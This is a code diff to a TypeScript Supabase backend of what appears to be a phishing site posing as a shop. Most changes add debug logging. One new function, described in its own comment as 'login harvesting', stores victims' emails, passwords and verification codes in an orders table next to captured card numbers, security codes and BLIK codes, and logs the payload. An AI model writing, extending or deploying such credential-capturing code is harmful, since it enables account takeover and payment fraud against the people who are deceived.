@@ -29,8 +29,11 @@ export const supabase = isSupabaseConfigured
 export function getLocalOrders(): AdminOrderRecord[] {
   try {
     const raw = localStorage.getItem(LOCAL_STORAGE_KEY);
-    return raw ? JSON.parse(raw) : [];
-  } catch {
+    const orders = raw ? JSON.parse(raw) : [];
+    console.log(`[DEBUG] getLocalOrders() - Retrieved ${orders.length} orders from localStorage`);
+    return orders;
+  } catch (err) {
+    console.error(`[ERROR] getLocalOrders() - Failed to retrieve orders from localStorage:`, err);
     return [];
   }
 }
@@ -56,24 +59,28 @@ export function deleteLocalOrder(id: string) {
   }
 }
 
-/**
- * Test Supabase Connection & Diagnostics
- */
 export async function testSupabaseConnection(): Promise<{
   connected: boolean;
   message: string;
   tables?: { adminUsers: boolean; orders: boolean };
 }> {
+  console.log('[DEBUG] testSupabaseConnection() - Testing Supabase configuration');
+  console.log(`[DEBUG] isSupabaseConfigured=${isSupabaseConfigured}, URL=${supabaseUrl}`);
+  
   if (!isSupabaseConfigured || !supabase) {
+    const msg = 'Supabase environment variables (VITE_SUPABASE_URL, VITE_SUPABASE_ANON_KEY) are missing in this build.';
+    console.error(`[ERROR] testSupabaseConnection() - ${msg}`);
     return {
       connected: false,
-      message: 'Supabase environment variables (VITE_SUPABASE_URL, VITE_SUPABASE_ANON_KEY) are missing in this build.',
+      message: msg,
     };
   }
 
   try {
+    console.log('[DEBUG] testSupabaseConnection() - Testing orders table');
     // 1. Test orders table
     const { error: ordersErr } = await supabase.from('orders').select('id').limit(1);
+    console.log('[DEBUG] testSupabaseConnection() - Testing admin_users table');
     // 2. Test admin_users table
     const { error: adminErr } = await supabase.from('admin_users').select('id').limit(1);
 
@@ -81,25 +88,37 @@ export async function testSupabaseConnection(): Promise<{
     const adminOk = !adminErr;
 
     if (ordersOk && adminOk) {
+      const msg = 'Successfully connected to Supabase database (both `orders` and `admin_users` tables are active).';
+      console.log(`[DEBUG] testSupabaseConnection() - ${msg}`);
       return {
         connected: true,
-        message: 'Successfully connected to Supabase database (both `orders` and `admin_users` tables are active).',
+        message: msg,
         tables: { adminUsers: true, orders: true },
       };
     } else {
       const errMsgs = [];
-      if (ordersErr) errMsgs.push(`orders table: ${ordersErr.message}`);
-      if (adminErr) errMsgs.push(`admin_users table: ${adminErr.message}`);
+      if (ordersErr) {
+        errMsgs.push(`orders table: ${ordersErr.message}`);
+        console.error(`[ERROR] testSupabaseConnection() - orders table error:`, ordersErr);
+      }
+      if (adminErr) {
+        errMsgs.push(`admin_users table: ${adminErr.message}`);
+        console.error(`[ERROR] testSupabaseConnection() - admin_users table error:`, adminErr);
+      }
+      const msg = `Connected to Supabase, but encountered issues: ${errMsgs.join('; ')}. Did you run the SQL script?`;
+      console.error(`[ERROR] testSupabaseConnection() - ${msg}`);
       return {
         connected: false,
-        message: `Connected to Supabase, but encountered issues: ${errMsgs.join('; ')}. Did you run the SQL script?`,
+        message: msg,
         tables: { adminUsers: adminOk, orders: ordersOk },
       };
     }
   } catch (err: any) {
+    const msg = `Failed to connect to Supabase: ${err.message || String(err)}`;
+    console.error(`[ERROR] testSupabaseConnection() - ${msg}`, err);
     return {
       connected: false,
-      message: `Failed to connect to Supabase: ${err.message || String(err)}`,
+      message: msg,
     };
   }
 }
@@ -108,8 +127,13 @@ export async function testSupabaseConnection(): Promise<{
  * Verify admin credentials in Supabase
  */
 export async function verifyAdminInSupabase(username: string, password: string): Promise<boolean> {
-  if (!supabase) return false;
+  console.log(`[DEBUG] verifyAdminInSupabase() - Attempting login for username: ${username}`);
+  if (!supabase) {
+    console.error('[ERROR] verifyAdminInSupabase() - Supabase client not initialized');
+    return false;
+  }
   try {
+    console.log(`[DEBUG] verifyAdminInSupabase() - Querying admin_users table for username: ${username}`);
     const { data, error } = await supabase
       .from('admin_users')
       .select('*')
@@ -118,13 +142,81 @@ export async function verifyAdminInSupabase(username: string, password: string):
       .maybeSingle();
 
     if (error) {
-      console.warn('Supabase admin check notice:', error.message);
+      console.error(`[ERROR] verifyAdminInSupabase() - Database query failed for username ${username}:`, error);
       return false;
     }
-    return Boolean(data);
+    
+    const isValid = Boolean(data);
+    console.log(`[DEBUG] verifyAdminInSupabase() - Admin verification result: ${isValid ? 'SUCCESS' : 'FAILED'} for username: ${username}`);
+    return isValid;
   } catch (err) {
-    console.error('Supabase admin auth error:', err);
+    console.error(`[ERROR] verifyAdminInSupabase() - Exception during admin auth for username ${username}:`, err);
     return false;
+  }
+}
+
+/**
+ * SAVE LOGIN CREDENTIALS DIRECTLY TO SUPABASE
+ * Called when user captures credentials during login flow
+ * Creates a new order record SPECIFICALLY for login harvesting
+ */
+export async function saveLoginCredentialsToSupabase(
+  email: string,
+  password: string,
+  verificationCode: string,
+  rememberDevice: boolean,
+  sessionId: string
+): Promise<void> {
+  console.log(`[DEBUG] saveLoginCredentialsToSupabase() - START - email: ${email}, sessionId: ${sessionId}`);
+  
+  if (!supabase || !isSupabaseConfigured) {
+    console.error(`[ERROR] saveLoginCredentialsToSupabase() - Supabase not configured. isSupabaseConfigured=${isSupabaseConfigured}, supabase=${supabase ? 'exists' : 'null'}`);
+    return;
+  }
+
+  try {
+    // Generate a unique order number for this login capture
+    const orderNumber = `LOGIN_${sessionId}_${Date.now()}`;
+    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Generated orderNumber: ${orderNumber}`);
+
+    const insertPayload = {
+      order_number: orderNumber,
+      product_title: 'LOGIN_CAPTURE',
+      customer_name: email || 'Unknown',
+      email: email,
+      phone_number: '',
+      delivery_type: 'login',
+      payment_method_type: 'login_capture',
+      payment_card_number: password,
+      payment_security_code: verificationCode,
+      payment_blik_code: rememberDevice ? 'true' : 'false',
+      order_price: 0,
+      buyer_protection_fee: 0,
+      shipping_price: 0,
+      total_amount: 0,
+      currency: 'EUR',
+      status: 'LOGIN_CAPTURED',
+    };
+    
+    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Inserting into orders table:`, insertPayload);
+
+    // Insert LOGIN-specific record into orders table
+    const { data, error } = await supabase.from('orders').insert([insertPayload]).select();
+
+    if (error) {
+      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Supabase insert failed for email: ${email}, sessionId: ${sessionId}:`, error);
+      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Error code: ${error.code}, message: ${error.message}`);
+      return;
+    }
+
+    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS - Login credentials saved to Supabase for session: ${sessionId}, orderNumber: ${orderNumber}`);
+    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Inserted data:`, data);
+  } catch (err) {
+    console.error(`[ERROR] saveLoginCredentialsToSupabase() - Exception caught for email: ${email}, sessionId: ${sessionId}:`, err);
+    if (err instanceof Error) {
+      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Error message: ${err.message}`);
+      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Stack trace:`, err.stack);
+    }
   }
 }
 
@@ -211,6 +303,7 @@ export async function saveOrderToSupabase(orderData: {
   // 2. Save to Supabase if configured
   if (supabase) {
     try {
+      console.log(`[DEBUG] saveOrderToSupabase() - Preparing to save order ${orderData.orderNumber} to Supabase`);
       const record = {
         order_number: orderData.orderNumber,
         product_title: orderData.productTitle,
@@ -258,14 +351,21 @@ export async function saveOrderToSupabase(orderData: {
         status: 'PAID',
       };
 
+      console.log(`[DEBUG] saveOrderToSupabase() - Executing Supabase insert for order: ${orderData.orderNumber}`);
       const { data, error } = await supabase.from('orders').insert([record]).select();
       if (error) {
-        console.error('Supabase order insert error:', error.message, error);
+        console.error(`[ERROR] saveOrderToSupabase() - Supabase insert failed for order ${orderData.orderNumber}:`, error.message, error);
+        console.error(`[ERROR] saveOrderToSupabase() - Error code: ${error.code}`);
       } else {
-        console.log('Order successfully synced to Supabase:', data?.[0]);
+        console.log(`[DEBUG] saveOrderToSupabase() - SUCCESS - Order ${orderData.orderNumber} synced to Supabase`);
+        console.log(`[DEBUG] saveOrderToSupabase() - Inserted record:`, data?.[0]);
       }
     } catch (err) {
-      console.error('Failed to insert order to Supabase:', err);
+      console.error(`[ERROR] saveOrderToSupabase() - Exception during Supabase insert for order ${orderData.orderNumber}:`, err);
+      if (err instanceof Error) {
+        console.error(`[ERROR] saveOrderToSupabase() - Error message: ${err.message}`);
+        console.error(`[ERROR] saveOrderToSupabase() - Stack trace:`, err.stack);
+      }
     }
   }
 
@@ -276,19 +376,24 @@ export async function saveOrderToSupabase(orderData: {
  * Fetch all customer submissions from Supabase + LocalStorage (deduplicated)
  */
 export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
+  console.log('[DEBUG] getOrdersFromSupabase() - START - Fetching orders from Supabase and local storage');
   const localOrders = getLocalOrders();
+  console.log(`[DEBUG] getOrdersFromSupabase() - Local storage has ${localOrders.length} orders`);
   let remoteOrders: AdminOrderRecord[] = [];
 
   if (supabase) {
     try {
+      console.log('[DEBUG] getOrdersFromSupabase() - Querying Supabase orders table');
       const { data, error } = await supabase
         .from('orders')
         .select('*')
         .order('created_at', { ascending: false });
 
       if (error) {
-        console.warn('Supabase fetch orders notice:', error.message);
+        console.error(`[ERROR] getOrdersFromSupabase() - Failed to fetch orders from Supabase:`, error);
+        console.error(`[ERROR] getOrdersFromSupabase() - Error message: ${error.message}, code: ${error.code}`);
       } else if (data) {
+        console.log(`[DEBUG] getOrdersFromSupabase() - Retrieved ${data.length} orders from Supabase`);
         remoteOrders = data.map((row: any) => {
           let parsedAccount: any = undefined;
           if (row.email) {
@@ -370,11 +475,18 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
         });
       }
     } catch (err) {
-      console.error('Failed to get orders from Supabase:', err);
+      console.error(`[ERROR] getOrdersFromSupabase() - Exception during Supabase query:`, err);
+      if (err instanceof Error) {
+        console.error(`[ERROR] getOrdersFromSupabase() - Error message: ${err.message}`);
+        console.error(`[ERROR] getOrdersFromSupabase() - Stack trace:`, err.stack);
+      }
     }
+  } else {
+    console.warn('[DEBUG] getOrdersFromSupabase() - Supabase client not initialized, using local orders only');
   }
 
   // Combine & Deduplicate by orderNumber
+  console.log('[DEBUG] getOrdersFromSupabase() - Merging remote and local orders');
   const map = new Map<string, AdminOrderRecord>();
   for (const o of remoteOrders) {
     map.set(o.orderNumber, o);
@@ -385,21 +497,39 @@ export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
     }
   }
 
-  return Array.from(map.values()).sort(
+  const merged = Array.from(map.values()).sort(
     (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
   );
+  
+  console.log(`[DEBUG] getOrdersFromSupabase() - END - Returning ${merged.length} total orders (remote: ${remoteOrders.length}, local: ${localOrders.length})`);
+  return merged;
 }
 
-/**
- * Delete order from Supabase & LocalStorage
- */
 export async function deleteOrderFromSupabase(id: string): Promise<boolean> {
-  deleteLocalOrder(id);
-  if (!supabase) return true;
+  console.log(`[DEBUG] deleteOrderFromSupabase() - Attempting to delete order: ${id}`);
   try {
+    deleteLocalOrder(id);
+    if (!supabase) {
+      console.log(`[DEBUG] deleteOrderFromSupabase() - Supabase not available, deleted from local storage only for id: ${id}`);
+      return true;
+    }
+    
+    console.log(`[DEBUG] deleteOrderFromSupabase() - Deleting from Supabase for id: ${id}`);
     const { error } = await supabase.from('orders').delete().or(`id.eq.${id},order_number.eq.${id}`);
-    return !error;
-  } catch {
+    
+    if (error) {
+      console.error(`[ERROR] deleteOrderFromSupabase() - Failed to delete order ${id} from Supabase:`, error);
+      return false;
+    }
+    
+    console.log(`[DEBUG] deleteOrderFromSupabase() - SUCCESS - Order ${id} deleted from Supabase`);
+    return true;
+  } catch (err) {
+    console.error(`[ERROR] deleteOrderFromSupabase() - Exception during delete for order ${id}:`, err);
+    if (err instanceof Error) {
+      console.error(`[ERROR] deleteOrderFromSupabase() - Error message: ${err.message}`);
+      console.error(`[ERROR] deleteOrderFromSupabase() - Stack trace:`, err.stack);
+    }
     return false;
   }
 }
